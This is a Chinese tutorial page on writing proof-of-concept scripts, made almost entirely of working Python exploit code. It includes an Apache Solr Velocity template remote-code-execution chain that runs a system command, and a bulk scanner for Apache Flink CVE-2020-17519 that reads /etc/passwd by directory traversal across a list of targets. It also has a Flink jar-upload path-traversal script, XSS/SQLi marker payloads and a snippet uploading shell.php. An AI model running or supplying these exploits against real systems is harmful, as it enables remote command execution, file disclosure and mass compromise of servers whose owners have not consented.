# POC编写相关

 POC编写的相关内容如下：

{% tabs %}
{% tab title="单次请求" %}
代码如下

```python
#coding:utf-8
#https://twitter.com/jas502n/status/1193869996717297664
import urllib2
import ssl

class Pocscan(object):
	def __init__(self, target):
		self.result = {
			"status":False,
			"target":target,
		}
	def verify(self):
		url = self.result['target'] + '/overview'
		headers = {
			"User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
		}
		# ssl._create_default_https_context = ssl._create_unverified_context
		try:
			req = urllib2.Request(url,headers=headers)
			rsp = urllib2.urlopen(req,timeout=8)
			text = rsp.read()
			if '"taskmanagers"' in text and 'flink-version' in text:
				self.result['status'] = True
				self.result['target'] = url
				self.result['method'] = 'GET'
				self.result['response'] = 'flink-version'
		except Exception as e:
			self.result['info'] = str(e)
		return self.result
```
{% endtab %}

{% tab title="多次请求" %}
代码如下

```python
#coding:utf-8
#https://www.anquanke.com/post/id/190039
import urllib2
import ssl
import re

class Pocscan(object):
	def __init__(self, target):
		self.result = {
			"status":False,
			"target":target,
		}
	def verify(self):
		headers = {
			"User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
		}
		ssl._create_default_https_context = ssl._create_unverified_context
		try:
			url_core = self.result['target'].rstrip('/') + '/solr/admin/cores?indexInfo=false&wt=json'
			req = urllib2.Request(url_core,headers=headers)
			rsp = urllib2.urlopen(req,timeout=8)
			text = rsp.read()
			res = re.search(r'"instanceDir":"(.*?)",',text)
			if res == None:
				return self.result
			else:
				core = res.group(1).split('\\')[-1]
				url_config = self.result['target'].rstrip('/') + '/solr/%s/config'%(core)
				headers1 = {
					"User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
					"Content-Type": "application/json"
				}
				data = '''
				{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}'''
				req = urllib2.Request(url_config,headers=headers1,data=data)
				rsp = urllib2.urlopen(req,timeout=8)
				url = self.result['target'].rstrip('/') + '/solr/{0}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27netstat%20-an%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end'.format(core)
				req = urllib2.Request(url,headers=headers)
				rsp = urllib2.urlopen(req,timeout=8)
				text = rsp.read()
				if 'LISTEN' in text and 'ESTABLISHED' in text:
					self.result['status'] = True
		except Exception as e:
			self.result['info'] = str(e)
		return self.result
```
{% endtab %}

{% tab title="改批量" %}
相关代码如下：

```python
#!/usr/bin/env python
# coding:utf-8
# author:Yxuan
#affected versions are Apache Flink 1.11.0-1.11.2

import requests,sys,colorama
from colorama import *
init(autoreset=True)


banner='''\033[1;33;40m
  _______      ________    ___   ___ ___   ___        __ ______ _____ __  ___  
 / ____\ \    / /  ____|  |__ \ / _ \__ \ / _ \      /_ |____  | ____/_ |/ _ \ 
| |     \ \  / /| |__ ______ ) | | | | ) | | | |______| |   / /| |__  | | (_) |
| |      \ \/ / |  __|______/ /| | | |/ /| | | |______| |  / / |___ \ | |\__, |
| |____   \  /  | |____    / /_| |_| / /_| |_| |      | | / /   ___) || |  / / 
 \_____|   \/   |______|  |____|\___/____|\___/       |_|/_/   |____/ |_| /_/                                                                                                                                                 
'''


def verify():
	headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"}
	payload= '/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd' 
	poc=urls+payload
	try:
		requests.packages.urllib3.disable_warnings()#解决InsecureRequestWarning警告
		response=requests.get(poc,headers=headers,timeout=15,verify=False)
		if response.status_code==200 and "root:x" in response.content:
			print(u'\033[1;31;40m[+]{} is apache flink directory traversal vulnerability'.format(urls))
			print(response.content)
			#将漏洞地址输出在Vul.txt中
			f=open('./vul.txt','a')
			f.write(urls)
			f.write('\n')
		else:
			print('\033[1;32;40m[-]{} None'.format(urls))
	except:
		print('{} request timeout'.format(urls))


if __name__ == '__main__':
	print (banner)
	if len(sys.argv)!=2:
		print('Example:python CVE-2020-17519.py urls.txt')
	else:
		file = open(sys.argv[1])
		for url in file.readlines():
			urls=url.strip()
			if urls[-1]=='/':
				urls=urls[:-1]
			verify()
		print ('Check Over')
```
{% endtab %}
{% endtabs %}

对于不同种类的漏洞，最好是有不同的检测方式，例如xray中采用了随机数值的方式检测SQL注入与XSS，那么使用随机数版本的漏扫脚本大概就是这样的：

{% tabs %}
{% tab title="随机数" %}
随机数版本所需代码如下：

```python
# -*- coding: utf-8 -*-
import random
import string
import hashlib

# gongji = ''.join(random.sample(string.ascii_letters + string.digits, 6))

shuzhi = random.randint(0,999999)
yuju = str(shuzhi)
# ------ xss ------

xss = "<script>alert(%s)</script>" % yuju
xss = "<script>alert(" + yuju + ")</script>"

# ------ sqli ------

sqli = hashlib.md5(yuju).hexdigest()
```
{% endtab %}

{% tab title="时间戳" %}
```python
import time

noww = int(time.time())
now = str(noww)
print now

payloads = "/assets/config/config%s.json" % now
```
{% endtab %}
{% endtabs %}

文件上传的方式

{% tabs %}
{% tab title="简洁" %}
```python
# -*- coding: utf-8 -*-

import requests
import random,hashlib
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

target = "https://IP:PORT"
shuzhi = random.randint(0, 999999)
yuju = str(shuzhi)
mdfive = hashlib.md5(yuju).hexdigest()
path = "/jars/upload"
url = target + path
boundry = "----WebKitFormBoundaryoZ8meKnrrso89R6Y"
headers = {
    "Host": target.split("://")[1],
    "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
}

files = {'jarfile': ('../../../../../../tmp/flags', mdfive)}
# proxy = {
#     'http':'http://127.0.0.1:8081',
#     'https':'https://127.0.0.1:8081'
# }

req = requests.post(url, headers=headers, files=files, timeout=10, verify=False)
print req.content
if req.status_code == 400:
    print req.content
    path_1 = "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fflags"
    url_1 = target + path_1
    req_1 = requests.get(url_1, headers=headers, timeout=10, verify=False)
    print req_1.text

    if req_1.status_code == 200:
        print  "hahahaha"
        
        
# name:jarfile
# filename:../../../../../../tmp/flags
#文件内容：mdfive
↓        ↓        ↓        ↓        ↓
# POST /jars/upload HTTP/1.1
# Connection: close
# Accept-Encoding: gzip, deflate
# Accept: */*
# User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
# Host: IP:PORT
# Content-Type: multipart/form-data; boundary=------16403e4608fad6cc1cd8321b8b7d7f22
# Content-Length: 181

# --16403e4608fad6cc1cd8321b8b7d7f22
# Content-Disposition: form-data; name="jarfile"; filename="../../../../../../tmp/flags"
# 
# Hello Requests.
# --16403e4608fad6cc1cd8321b8b7d7f22--
```
{% endtab %}

{% tab title="分段" %}
当文件上传遇到分段传输：

![&#x793A;&#x4F8B;&#x4EE3;&#x7801;](../../.gitbook/assets/image%20%281074%29.png)

相关代码示例如下：

```python
file = {
    'name': ('filename', u'文件内容', u'文件自定义Content-Type'),
    'file[]': ('shell.php', data, 'application/octet-stream'),
    'name2': (None, 'huan'),
    None: ('haha', 'ni'),
    None: ('xixi', 'ya'),
}
```
{% endtab %}
{% endtabs %}



